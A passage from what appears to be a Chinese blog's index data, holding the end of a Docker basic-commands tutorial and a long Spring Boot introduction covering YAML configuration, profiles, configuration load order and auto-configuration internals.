默认拉取的是最新版本，如果需要特定版本，在后面指定即可，以tomcat7.0.1为例docker pull tomcat:7.0.1 查看已经下载的本地镜像： 12# 查看已经下载的本地镜像docker images 删除本地镜像 12# 删除本地镜像: docker rmi 镜像名称/IMAGE IDdocker rmi tomcat 根据镜像启动对应的容器 1234# 根据镜像启动对应的容器docker run -d --name mytomcat tomcat# --name 对容器起一个别名# -d 对指定的容器进行后台运行 停止运行的容器 12# 停止运行的容器：docker stop 容器名称/CONTAINER IDdocker stop mytomcat 查看正在运行的容器 12docker ps # 查看正在运行的容器docker ps -a # 查看本地所有的容器 删除容器 12# 注：删除容器是使用rm，删除镜像是rmi，且删除镜像之前需要停止运行容器并删除docker rm mytomcat 启动一个做了端口映射的容器 1234docker run -d --name mytomcat -p 8888:8080 tomcat# --name：对容器起一个别名# -p:将主机的端口映射到容器的一个端口 主机端口:容器内部的端口 # -d:后台运行 查看容器的日志docker logs mytomcat 容器开机自起动： 1docker update mytomcat --restart=always 进入对应的容器 1docker exec -it mytomcat /bin/bash 本地文件（是centos不是windows）与docker容器中文件之间的互传，以将ik分词器插件上传至elasticsearch容器为例： 123# 先将windows上的文件使用xftp上传到vmware linux中，然后将文件使用docker命令上传到docker容器中# docker cp 本地路径 容器名:容器路径docker cp ./elasticsearch-analysis-ik-6.5.4.zip elasticsearch:/usr/share/elasticsearch/plugins 注：以上指示Docker容器中常用的一些命令，对于不同的镜像的使用，其启动命令也是会有所区别，后面的一些命令会在使用的时候进行介绍，其他更多Docker操作可参考Docker官方文档：https://docs.docker.com/engine/reference/commandline/docker/ DockerFile","path":"2020/01/03/一文入门Docker容器技术/"},{"title":"Spring Boot如何学习？","text":"Spring Boot如何学习？ 1、Spring Boot 简介 简化Spring应用开发的一个框架； 整个Spring技术栈的一个大整合； J2EE开发的一站式解决方案； 2、微服务2014，martin fowler 微服务：架构风格（服务微化） 一个应用应该是一组小型服务；可以通过HTTP的方式进行互通； 单体应用：ALL IN ONE 微服务：每一个功能元素最终都是一个可独立替换和独立升级的软件单元； 详细参照微服务文档 3、环境准备http://www.gulixueyuan.com/ 谷粒学院 环境约束 –jdk1.8：Spring Boot 推荐jdk1.7及以上；java version “1.8.0_112” –maven3.x：maven 3.3以上版本；Apache Maven 3.3.9 –IntelliJIDEA2017：IntelliJ IDEA 2017.2.2 x64、STS –SpringBoot 1.5.9.RELEASE：1.5.9； 统一环境； 1、MAVEN设置；给maven 的settings.xml配置文件的profiles标签添加 123456789101112&lt;profile&gt; &lt;id&gt;jdk-1.8&lt;/id&gt; &lt;activation&gt; &lt;activeByDefault&gt;true&lt;/activeByDefault&gt; &lt;jdk&gt;1.8&lt;/jdk&gt; &lt;/activation&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;maven.compiler.compilerVersion&gt;1.8&lt;/maven.compiler.compilerVersion&gt; &lt;/properties&gt;&lt;/profile&gt; 2、IDEA设置整合maven进来； 4、Spring Boot HelloWorld一个功能： 浏览器发送hello请求，服务器接受请求并处理，响应Hello World字符串； 1、创建一个maven工程；（jar）2、导入spring boot相关的依赖1234567891011&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt; 3、编写一个主程序；启动Spring Boot应用12345678910111213/** * @SpringBootApplication 来标注一个主程序类，说明这是一个Spring Boot应用 */@SpringBootApplicationpublic class HelloWorldMainApplication &#123; public static void main(String[] args) &#123; // Spring应用启动起来 SpringApplication.run(HelloWorldMainApplication.class,args); &#125;&#125; 4、编写相关的Controller、Service123456789@Controllerpublic class HelloController &#123; @ResponseBody @RequestMapping(\"/hello\") public String hello()&#123; return \"Hello World!\"; &#125;&#125; 5、运行主程序测试6、简化部署123456789&lt;!-- 这个插件，可以将应用打包成一个可执行的jar包；--&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;/build&gt; 将这个应用打成jar包，直接使用java -jar的命令进行执行； 5、Hello World探究1、POM文件1、父项目1234567891011121314&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt;&lt;/parent&gt;他的父项目是&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt; &lt;version&gt;1.5.9.RELEASE&lt;/version&gt; &lt;relativePath&gt;../../spring-boot-dependencies&lt;/relativePath&gt;&lt;/parent&gt;他来真正管理Spring Boot应用里面的所有依赖版本； Spring Boot的版本仲裁中心； 以后我们导入依赖默认是不需要写版本；（没有在dependencies里面管理的依赖自然需要声明版本号） 2、启动器1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;&lt;/dependency&gt; spring-boot-starter-==web==： ​ spring-boot-starter：spring-boot场景启动器；帮我们导入了web模块正常运行所依赖的组件； Spring Boot将所有的功能场景都抽取出来，做成一个个的starters（启动器），只需要在项目里面引入这些starter相关场景的所有依赖都会导入进来。要用什么功能就导入什么场景的启动器 2、主程序类，主入口类123456789101112/** * @SpringBootApplication 来标注一个主程序类，说明这是一个Spring Boot应用 */@SpringBootApplicationpublic class HelloWorldMainApplication &#123; public static void main(String[] args) &#123; // Spring应用启动起来 SpringApplication.run(HelloWorldMainApplication.class,args); &#125;&#125; @SpringBootApplication: Spring Boot应用标注在某个类上说明这个类是SpringBoot的主配置类，SpringBoot就应该运行这个类的main方法来启动SpringBoot应用； 12345678910@Target(ElementType.TYPE)@Retention(RetentionPolicy.RUNTIME)@Documented@Inherited@SpringBootConfiguration@EnableAutoConfiguration@ComponentScan(excludeFilters = &#123; @Filter(type = FilterType.CUSTOM, classes = TypeExcludeFilter.class), @Filter(type = FilterType.CUSTOM, classes = AutoConfigurationExcludeFilter.class) &#125;)public @interface SpringBootApplication &#123; @SpringBootConfiguration:Spring Boot的配置类； ​ 标注在某个类上，表示这是一个Spring Boot的配置类； ​ @Configuration:配置类上来标注这个注解； ​ 配置类 ——- 配置文件；配置类也是容器中的一个组件；@Component @EnableAutoConfiguration：开启自动配置功能； ​ 以前我们需要配置的东西，Spring Boot帮我们自动配置；@EnableAutoConfiguration告诉SpringBoot开启自动配置功能；这样自动配置才能生效； 123@AutoConfigurationPackage@Import(EnableAutoConfigurationImportSelector.class)public @interface EnableAutoConfiguration &#123; ​ @AutoConfigurationPackage：自动配置包 ​ @Import(AutoConfigurationPackages.Registrar.class)： ​ Spring的底层注解@Import，给容器中导入一个组件；导入的组件由AutoConfigurationPackages.Registrar.class； ==将主配置类（@SpringBootApplication标注的类）的所在包及下面所有子包里面的所有组件扫描到Spring容器；== ​ @Import(EnableAutoConfigurationImportSelector.class)； ​ 给容器中导入组件？ ​ EnableAutoConfigurationImportSelector：导入哪些组件的选择器； ​ 将所有需要导入的组件以全类名的方式返回；这些组件就会被添加到容器中； ​ 会给容器中导入非常多的自动配置类（xxxAutoConfiguration）；就是给容器中导入这个场景需要的所有组件，并配置好这些组件； 有了自动配置类，免去了我们手动编写配置注入功能组件等的工作； ​ SpringFactoriesLoader.loadFactoryNames(EnableAutoConfiguration.class,classLoader)； ==Spring Boot在启动的时候从类路径下的META-INF/spring.factories中获取EnableAutoConfiguration指定的值，将这些值作为自动配置类导入到容器中，自动配置类就生效，帮我们进行自动配置工作；==以前我们需要自己配置的东西，自动配置类都帮我们； J2EE的整体整合解决方案和自动配置都在spring-boot-autoconfigure-1.5.9.RELEASE.jar； ​ ==Spring注解版（谷粒学院）== 6、使用Spring Initializer快速创建Spring Boot项目1、IDEA：使用 Spring Initializer快速创建项目IDE都支持使用Spring的项目创建向导快速创建一个Spring Boot项目； 选择我们需要的模块；向导会联网创建Spring Boot项目； 默认生成的Spring Boot项目； 主程序已经生成好了，我们只需要我们自己的逻辑 resources文件夹中目录结构 static：保存所有的静态资源； js css images； templates：保存所有的模板页面；（Spring Boot默认jar包使用嵌入式的Tomcat，默认不支持JSP页面）；可以使用模板引擎（freemarker、thymeleaf）； application.properties：Spring Boot应用的配置文件；可以修改一些默认设置； 2、STS使用 Spring Starter Project快速创建项目 二、配置文件1、配置文件SpringBoot使用一个全局的配置文件，配置文件名是固定的； •application.properties •application.yml 配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好； YAML（YAML Ain’t Markup Language） ​ YAML A Markup Language：是一个标记语言 ​ YAML isn’t Markup Language：不是一个标记语言； 标记语言： ​ 以前的配置文件；大多都使用的是 xxxx.xml文件； ​ YAML：以数据为中心，比json、xml等更适合做配置文件； ​ YAML：配置例子 12server: port: 8081 ​ XML： 123&lt;server&gt; &lt;port&gt;8081&lt;/port&gt;&lt;/server&gt; 2、YAML语法：1、基本语法k:(空格)v：表示一对键值对（空格必须有）； 以空格的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的 123server: port: 8081 path: /hello 属性和值也是大小写敏感； 2、值的写法字面量：普通的值（数字，字符串，布尔）​ k: v：字面直接来写； ​ 字符串默认不用加上单引号或者双引号； ​ “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思 ​ name: “zhangsan \\n lisi”：输出；zhangsan 换行 lisi ​ ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据 ​ name: ‘zhangsan \\n lisi’：输出；zhangsan \\n lisi 对象、Map（属性和值）（键值对）：​ k: v：在下一行来写对象的属性和值的关系；注意缩进 ​ 对象还是k: v的方式 123friends: lastName: zhangsan age: 20 行内写法： 1friends: &#123;lastName: zhangsan,age: 18&#125; 数组（List、Set）：用- 值表示数组中的一个元素 1234pets: - cat - dog - pig 行内写法 1pets: [cat,dog,pig] 3、配置文件值注入配置文件 123456789101112person: lastName: hello age: 18 boss: false birth: 2017/12/12 maps: &#123;k1: v1,k2: 12&#125; lists: - lisi - zhaoliu dog: name: 小狗 age: 12 javaBean： 1234567891011121314151617181920/** * 将配置文件中配置的每一个属性的值，映射到这个组件中 * @ConfigurationProperties：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定； * prefix = \"person\"：配置文件中哪个下面的所有属性进行一一映射 * * 只有这个组件是容器中的组件，才能容器提供的@ConfigurationProperties功能； * */@Component@ConfigurationProperties(prefix = \"person\")public class Person &#123; private String lastName; private Integer age; private Boolean boss; private Date birth; private Map&lt;String,Object&gt; maps; private List&lt;Object&gt; lists; private Dog dog; 我们可以导入配置文件处理器，以后编写配置就有提示了 123456&lt;!--导入配置文件处理器，配置文件进行绑定就会有提示--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; 1、properties配置文件在idea中默认utf-8可能会乱码调整 2、@Value获取值和@ConfigurationProperties获取值比较 @ConfigurationProperties @Value 功能 批量注入配置文件中的属性 一个个指定 松散绑定（松散语法） 支持 不支持 SpEL 不支持 支持 JSR303数据校验 支持 不支持 复杂类型封装 支持 不支持 配置文件yml还是properties他们都能获取到值； 如果说，我们只是在某个业务逻辑中需要获取一下配置文件中的某项值，使用@Value； 如果说，我们专门编写了一个javaBean来和配置文件进行映射，我们就直接使用@ConfigurationProperties； 3、配置文件注入值数据校验123456789101112131415161718192021222324@Component@ConfigurationProperties(prefix = \"person\")@Validatedpublic class Person &#123; /** * &lt;bean class=\"Person\"&gt; * &lt;property name=\"lastName\" value=\"字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;\"&gt;&lt;/property&gt; * &lt;bean/&gt; */ //lastName必须是邮箱格式 @Email //@Value(\"$&#123;person.last-name&#125;\") private String lastName; //@Value(\"#&#123;11*2&#125;\") private Integer age; //@Value(\"true\") private Boolean boss; private Date birth; private Map&lt;String,Object&gt; maps; private List&lt;Object&gt; lists; private Dog dog; 4、@PropertySource&amp;@ImportResource&amp;@Bean@PropertySource：加载指定的配置文件； 1234567891011121314151617181920212223242526272829/** * 将配置文件中配置的每一个属性的值，映射到这个组件中 * @ConfigurationProperties：告诉SpringBoot将本类中的所有属性和配置文件中相关的配置进行绑定； * prefix = \"person\"：配置文件中哪个下面的所有属性进行一一映射 * * 只有这个组件是容器中的组件，才能容器提供的@ConfigurationProperties功能； * @ConfigurationProperties(prefix = \"person\")默认从全局配置文件中获取值； * */@PropertySource(value = &#123;\"classpath:person.properties\"&#125;)@Component@ConfigurationProperties(prefix = \"person\")//@Validatedpublic class Person &#123; /** * &lt;bean class=\"Person\"&gt; * &lt;property name=\"lastName\" value=\"字面量/$&#123;key&#125;从环境变量、配置文件中获取值/#&#123;SpEL&#125;\"&gt;&lt;/property&gt; * &lt;bean/&gt; */ //lastName必须是邮箱格式 // @Email //@Value(\"$&#123;person.last-name&#125;\") private String lastName; //@Value(\"#&#123;11*2&#125;\") private Integer age; //@Value(\"true\") private Boolean boss; @ImportResource：导入Spring的配置文件，让配置文件里面的内容生效； Spring Boot里面没有Spring的配置文件，我们自己编写的配置文件，也不能自动识别； 想让Spring的配置文件生效，加载进来；@ImportResource标注在一个配置类上 12@ImportResource(locations = &#123;\"classpath:beans.xml\"&#125;)导入Spring的配置文件让其生效 不来编写Spring的配置文件 12345678&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"helloService\" class=\"com.atguigu.springboot.service.HelloService\"&gt;&lt;/bean&gt;&lt;/beans&gt; SpringBoot推荐给容器中添加组件的方式；推荐使用全注解的方式 1、配置类@Configuration———&gt;Spring配置文件 2、使用@Bean给容器中添加组件 12345678910111213141516/** * @Configuration：指明当前类是一个配置类；就是来替代之前的Spring配置文件 * * 在配置文件中用&lt;bean&gt;&lt;bean/&gt;标签添加组件 * */@Configurationpublic class MyAppConfig &#123; //将方法的返回值添加到容器中；容器中这个组件默认的id就是方法名 @Bean public HelloService helloService02()&#123; System.out.println(\"配置类@Bean给容器中添加组件了...\"); return new HelloService(); &#125;&#125; 4、配置文件占位符1、随机数12$&#123;random.value&#125;、$&#123;random.int&#125;、$&#123;random.long&#125;$&#123;random.int(10)&#125;、$&#123;random.int[1024,65536]&#125; 2、占位符获取之前配置的值，如果没有可以是用:指定默认值123456789person.last-name=张三$&#123;random.uuid&#125;person.age=$&#123;random.int&#125;person.birth=2017/12/15person.boss=falseperson.maps.k1=v1person.maps.k2=14person.lists=a,b,cperson.dog.name=$&#123;person.hello:hello&#125;_dogperson.dog.age=15 5、Profile1、多Profile文件我们在主配置文件编写的时候，文件名可以是 application-{profile}.properties/yml 默认使用application.properties的配置； 2、yml支持多文档块方式1234567891011121314151617181920server: port: 8081spring: profiles: active: prod---server: port: 8083spring: profiles: dev---server: port: 8084spring: profiles: prod #指定属于哪个环境 3、激活指定profile​ 1、在配置文件中指定 spring.profiles.active=dev ​ 2、命令行： ​ java -jar spring-boot-02-config-0.0.1-SNAPSHOT.jar —spring.profiles.active=dev； ​ 可以直接在测试的时候，配置传入命令行参数 ​ 3、虚拟机参数； ​ -Dspring.profiles.active=dev 6、配置文件加载位置springboot 启动会扫描以下位置的application.properties或者application.yml文件作为Spring boot的默认配置文件 –file:./config/ –file:./ –classpath:/config/ –classpath:/ 优先级由高到底，高优先级的配置会覆盖低优先级的配置； SpringBoot会从这四个位置全部加载主配置文件；互补配置； ==我们还可以通过spring.config.location来改变默认的配置文件位置== 项目打包好以后，我们可以使用命令行参数的形式，启动项目的时候来指定配置文件的新位置；指定配置文件和默认加载的这些配置文件共同起作用形成互补配置； java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar —spring.config.location=G:/application.properties 7、外部配置加载顺序==SpringBoot也可以从以下位置加载配置； 优先级从高到低；高优先级的配置覆盖低优先级的配置，所有的配置会形成互补配置== 1.命令行参数 所有的配置都可以在命令行上进行指定 java -jar spring-boot-02-config-02-0.0.1-SNAPSHOT.jar —server.port=8087 —server.context-path=/abc 多个配置用空格分开； —配置项=值 2.来自java:comp/env的JNDI属性 3.Java系统属性（System.getProperties()） 4.操作系统环境变量 5.RandomValuePropertySource配置的random.*属性值 ==由jar包外向jar包内进行寻找；== ==优先加载带profile== 6.jar包外部的application-{profile}.properties或application.yml(带spring.profile)配置文件 7.jar包内部的application-{profile}.properties或application.yml(带spring.profile)配置文件 ==再来加载不带profile== 8.jar包外部的application.properties或application.yml(不带spring.profile)配置文件 9.jar包内部的application.properties或application.yml(不带spring.profile)配置文件 10.@Configuration注解类上的@PropertySource 11.通过SpringApplication.setDefaultProperties指定的默认属性 所有支持的配置加载来源； 参考官方文档 8、自动配置原理配置文件到底能写什么？怎么写？自动配置原理； 配置文件能配置的属性参照 1、自动配置原理：1）、SpringBoot启动的时候加载主配置类，开启了自动配置功能 ==@EnableAutoConfiguration== 2）、@EnableAutoConfiguration 作用： 利用EnableAutoConfigurationImportSelector给容器中导入一些组件？ 可以查看selectImports()方法的内容； List configurations = getCandidateConfigurations(annotationMetadata, attributes);获取候选的配置 1234SpringFactoriesLoader.loadFactoryNames()扫描所有jar包类路径下 META-INF/spring.factories把扫描到的这些文件的内容包装成properties对象从properties中获取到EnableAutoConfiguration.class类（类名）对应的值，然后把他们添加在容器中 ​ ==将 类路径下 META-INF/spring.factories 里面配置的所有EnableAutoConfiguration的值加入到了容器中；== 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798# Auto Configureorg.springframework.boot.autoconfigure.EnableAutoConfiguration=\\org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration,\\org.springframework.boot.autoconfigure.aop.AopAutoConfiguration,\\org.springframework.boot.autoconfigure.amqp.RabbitAutoConfiguration,\\org.springframework.boot.autoconfigure.batch.BatchAutoConfiguration,\\org.springframework.boot.autoconfigure.cache.CacheAutoConfiguration,\\org.springframework.boot.autoconfigure.cassandra.CassandraAutoConfiguration,\\org.springframework.boot.autoconfigure.cloud.CloudAutoConfiguration,\\org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAutoConfiguration,\\org.springframework.boot.autoconfigure.context.MessageSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.context.PropertyPlaceholderAutoConfiguration,\\org.springframework.boot.autoconfigure.couchbase.CouchbaseAutoConfiguration,\\org.springframework.boot.autoconfigure.dao.PersistenceExceptionTranslationAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.cassandra.CassandraRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.couchbase.CouchbaseRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.elasticsearch.ElasticsearchRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.jpa.JpaRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.ldap.LdapDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.ldap.LdapRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.mongo.MongoRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jDataAutoConfiguration,\\org.springframework.boot.autoconfigure.data.neo4j.Neo4jRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.solr.SolrRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration,\\org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration,\\org.springframework.boot.autoconfigure.data.rest.RepositoryRestMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.data.web.SpringDataWebAutoConfiguration,\\org.springframework.boot.autoconfigure.elasticsearch.jest.JestAutoConfiguration,\\org.springframework.boot.autoconfigure.freemarker.FreeMarkerAutoConfiguration,\\org.springframework.boot.autoconfigure.gson.GsonAutoConfiguration,\\org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration,\\org.springframework.boot.autoconfigure.hateoas.HypermediaAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastAutoConfiguration,\\org.springframework.boot.autoconfigure.hazelcast.HazelcastJpaDependencyAutoConfiguration,\\org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration,\\org.springframework.boot.autoconfigure.integration.IntegrationAutoConfiguration,\\org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.JndiDataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.XADataSourceAutoConfiguration,\\org.springframework.boot.autoconfigure.jdbc.DataSourceTransactionManagerAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JmsAutoConfiguration,\\org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.JndiConnectionFactoryAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.activemq.ActiveMQAutoConfiguration,\\org.springframework.boot.autoconfigure.jms.artemis.ArtemisAutoConfiguration,\\org.springframework.boot.autoconfigure.flyway.FlywayAutoConfiguration,\\org.springframework.boot.autoconfigure.groovy.template.GroovyTemplateAutoConfiguration,\\org.springframework.boot.autoconfigure.jersey.JerseyAutoConfiguration,\\org.springframework.boot.autoconfigure.jooq.JooqAutoConfiguration,\\org.springframework.boot.autoconfigure.kafka.KafkaAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.embedded.EmbeddedLdapAutoConfiguration,\\org.springframework.boot.autoconfigure.ldap.LdapAutoConfiguration,\\org.springframework.boot.autoconfigure.liquibase.LiquibaseAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderAutoConfiguration,\\org.springframework.boot.autoconfigure.mail.MailSenderValidatorAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.DeviceResolverAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.DeviceDelegatingViewResolverAutoConfiguration,\\org.springframework.boot.autoconfigure.mobile.SitePreferenceAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.embedded.EmbeddedMongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mongo.MongoAutoConfiguration,\\org.springframework.boot.autoconfigure.mustache.MustacheAutoConfiguration,\\org.springframework.boot.autoconfigure.orm.jpa.HibernateJpaAutoConfiguration,\\org.springframework.boot.autoconfigure.reactor.ReactorAutoConfiguration,\\org.springframework.boot.autoconfigure.security.SecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.SecurityFilterAutoConfiguration,\\org.springframework.boot.autoconfigure.security.FallbackWebSecurityAutoConfiguration,\\org.springframework.boot.autoconfigure.security.oauth2.OAuth2AutoConfiguration,\\org.springframework.boot.autoconfigure.sendgrid.SendGridAutoConfiguration,\\org.springframework.boot.autoconfigure.session.SessionAutoConfiguration,\\org.springframework.boot.autoconfigure.social.SocialWebAutoConfiguration,\\org.springframework.boot.autoconfigure.social.FacebookAutoConfiguration,\\org.springframework.boot.autoconfigure.social.LinkedInAutoConfiguration,\\org.springframework.boot.autoconfigure.social.TwitterAutoConfiguration,\\org.springframework.boot.autoconfigure.solr.SolrAutoConfiguration,\\org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration,\\org.springframework.boot.autoconfigure.transaction.jta.JtaAutoConfiguration,\\org.springframework.boot.autoconfigure.validation.ValidationAutoConfiguration,\\org.springframework.boot.autoconfigure.web.DispatcherServletAutoConfiguration,\\org.springframework.boot.autoconfigure.web.EmbeddedServletContainerAutoConfiguration,\\org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.web.HttpEncodingAutoConfiguration,\\org.springframework.boot.autoconfigure.web.HttpMessageConvertersAutoConfiguration,\\org.springframework.boot.autoconfigure.web.MultipartAutoConfiguration,\\org.springframework.boot.autoconfigure.web.ServerPropertiesAutoConfiguration,\\org.springframework.boot.autoconfigure.web.WebClientAutoConfiguration,\\org.springframework.boot.autoconfigure.web.WebMvcAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.WebSocketAutoConfiguration,\\org.springframework.boot.autoconfigure.websocket.WebSocketMessagingAutoConfiguration,\\org.springframework.boot.autoconfigure.webservices.WebServicesAutoConfiguration 每一个这样的 xxxAutoConfiguration类都是容器中的一个组件，都加入到容器中；用他们来做自动配置； 3）、每一个自动配置类进行自动配置功能； 4）、以HttpEncodingAutoConfiguration（Http编码自动配置）为例解释自动配置原理； 12345678910111213141516171819202122232425262728@Configuration //表示这是一个配置类，以前编写的配置文件一样，也可以给容器中添加组件@EnableConfigurationProperties(HttpEncodingProperties.class) //启动指定类的ConfigurationProperties功能；将配置文件中对应的值和HttpEncodingProperties绑定起来；并把HttpEncodingProperties加入到ioc容器中@ConditionalOnWebApplication //Spring底层@Conditional注解（Spring注解版），根据不同的条件，如果满足指定的条件，整个配置类里面的配置就会生效； 判断当前应用是否是web应用，如果是，当前配置类生效@ConditionalOnClass(CharacterEncodingFilter.class) //判断当前项目有没有这个类CharacterEncodingFilter；SpringMVC中进行乱码解决的过滤器；@ConditionalOnProperty(prefix = \"spring.http.encoding\", value = \"enabled\", matchIfMissing = true) //判断配置文件中是否存在某个配置 spring.http.encoding.enabled；如果不存在，判断也是成立的//即使我们配置文件中不配置pring.http.encoding.enabled=true，也是默认生效的；public class HttpEncodingAutoConfiguration &#123; //他已经和SpringBoot的配置文件映射了 private final HttpEncodingProperties properties; //只有一个有参构造器的情况下，参数的值就会从容器中拿 public HttpEncodingAutoConfiguration(HttpEncodingProperties properties) &#123; this.properties = properties; &#125; @Bean //给容器中添加一个组件，这个组件的某些值需要从properties中获取 @ConditionalOnMissingBean(CharacterEncodingFilter.class) //判断容器没有这个组件？ public CharacterEncodingFilter characterEncodingFilter() &#123; CharacterEncodingFilter filter = new OrderedCharacterEncodingFilter(); filter.setEncoding(this.properties.getCharset().name()); filter.setForceRequestEncoding(this.properties.shouldForce(Type.REQUEST)); filter.setForceResponseEncoding(this.properties.shouldForce(Type.RESPONSE)); return filter; &#125; 根据当前不同的条件判断，决定这个配置类是否生效？ 一但这个配置类生效；这个配置类就会给容器中添加各种组件；这些组件的属性是从对应的properties类中获取的，这些类里面的每一个属性又是和配置文件绑定的； 5）、所有在配置文件中能配置的属性都是在xxxxProperties类中封装者‘；配置文件能配置什么就可以参照某个功能对应的这个属性类 1234@ConfigurationProperties(prefix = \"spring.http.encoding\") //从配置文件中获取指定的值和bean的属性进行绑定public class HttpEncodingProperties &#123; public static final Charset DEFAULT_CHARSET = Charset.forName(\"UTF-8\"); 精髓： ​ 1）、SpringBoot启动会加载大量的自动配置类 ​ 2）、我们看我们需要的功能有没有SpringBoot默认写好的自动配置类； ​ 3）、我们再来看这个自动配置类中到底配置了哪些组件；（只要我们要用的组件有，我们就不需要再来配置了） ​ 4）、给容器中自动配置类添加组件的时候，会从properties类中获取某些属性。我们就可以在配置文件中指定这些属性的值； xxxxAutoConfigurartion：自动配置类； 给容器中添加组件 xxxxProperties:封装配置文件中相关属性； 2、细节1、@Conditional派生注解（Spring注解版原生的@Conditional作用）作用：必须是@Conditional指定的条件成立，才给容器中添加组件，配置配里面的所有内容才生效； @Conditional扩展注解 作用（判断是否满足当前指定条件） @ConditionalOnJava 系统的java版本是否符合要求 @ConditionalOnBean 容器中存在指定Bean； @ConditionalOnMissingBean 容器中不存在指定Bean； @ConditionalOnExpression 满足SpEL表达式指定 @ConditionalOnClass 系统中有指定的类 @ConditionalOnMissingClass 系统中没有指定的类 @ConditionalOnSingleCandidate 容器中只有一个指定的Bean，或者这个Bean是首选Bean @ConditionalOnProperty 系统中指定的属性是否有指定的值 @ConditionalOnResource 类路径下是否存在指定资源文件 @ConditionalOnWebApplication 当前是web环境 @ConditionalOnNotWebApplication 当前不是web环境 @ConditionalOnJndi JNDI存在指定项 自动配置类必须在一定的条件下才能生效； 我们怎么知道哪些自动配置类生效； ==我们可以通过启用 debug=true属性；来让控制台打印自动配置报告==，这样我们就可以很方便的知道哪些自动配置类生效； 1234567891011121314151617181920212223=========================AUTO-CONFIGURATION REPORT=========================Positive matches:（自动配置类启用的）----------------- DispatcherServletAutoConfiguration matched: - @ConditionalOnClass found required class 'org.springframework.web.servlet.DispatcherServlet'; @ConditionalOnMissingClass did not 